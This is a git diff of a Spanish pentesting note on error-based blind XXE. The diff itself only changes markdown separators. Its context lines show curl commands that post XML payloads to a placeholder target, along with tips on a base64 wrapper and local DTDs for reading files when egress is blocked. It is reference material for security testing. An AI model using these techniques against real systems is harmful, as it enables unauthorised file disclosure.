@@ -19,7 +19,7 @@ linked:
 ---
 # XXE - Blind Basado en Errores
 
-***
+---
 
 ## Cheatsheet
 
@@ -54,7 +54,7 @@ curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
 curl -X POST https://target/api -H 'Content-Type: application/xml' --data @local_dtd_payload.xml
 ```
 
-___
+---
 
 ## Overview
 
@@ -74,4 +74,4 @@ Las entities-defining-entities están prohibidas en el subset DTD **interno** de
 - **Saltos de línea en archivos:** parsers modernos (Java 8+) abortan ante `\n` en URI antes de imprimir el error completo. Wrapper base64 obligatorio para multiline.
 - **Egress bloqueado:** si no hay HTTP saliente → usar [[XXE - DTDs Locales]] para evitar la descarga del DTD externo.
 
-***
+---
